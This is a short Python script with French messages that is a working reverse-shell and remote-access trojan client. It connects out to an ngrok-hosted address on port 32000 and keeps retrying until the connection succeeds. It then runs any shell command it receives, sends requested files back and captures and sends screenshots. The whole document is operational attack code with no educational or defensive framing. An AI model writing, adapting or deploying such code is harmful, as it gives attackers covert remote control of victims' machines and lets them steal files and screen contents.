import socket,time,subprocess
import os,platform,datetime
from  PIL import ImageGrab
s =socket.socket()
IP_HOST = "www.1392-74-58-58-4.ngrok-free.app"
IP_PORT = 32000
MAX_DATA_SIZE = 1024
print(f"En attente de conexion du {IP_HOST}")
while True:
    try:
       s.connect((IP_HOST,IP_PORT))
    except ConnectionRefusedError:
        print("Erreur, connexion impossible,reconnexion...")
    else:
        print("connexion établie!")
        break

while True:
    commande_receive = s.recv(MAX_DATA_SIZE)
    reponse = None
    if not commande_receive:
        break
    commande_receive = commande_receive.decode()
    print(f"commande: {commande_receive}")
    commande_split = commande_receive.split(" ")
    if commande_receive == "info":
        reponse = platform.platform() + os.getcwd()
        reponse = reponse.encode()
    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
          os.chdir(commande_split[1])
        except:
          reponse = "le repertoire spécifié n'existe pas"
          reponse = reponse.encode()
        else:
            reponse = os.getcwd()
            reponse = reponse.encode()
    elif len(commande_split) == 2 and commande_split[0] == "dl":
        try:
            f = open(commande_split[1],"rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()
    elif commande_receive == "grab":
        try:
            img = ImageGrab.grab()
            img.save("capture.png","png")
        except:
            reponse = " "
        else:
            f = open("capture.png","rb")
            reponse = f.read()
            f.close()
    else:
        resultat = subprocess.run(commande_receive, shell=True, capture_output=True, universal_newlines=True)
        reponse = resultat.stdout + resultat.stderr
        reponse = reponse.encode()
        if not reponse or len(reponse) == 0:
            reponse = " ".encode()
    header = str(len(reponse)).zfill(13)
    s.sendall(header.encode())
    s.sendall(reponse)
s.close()
print("connexion fermé vec succes")

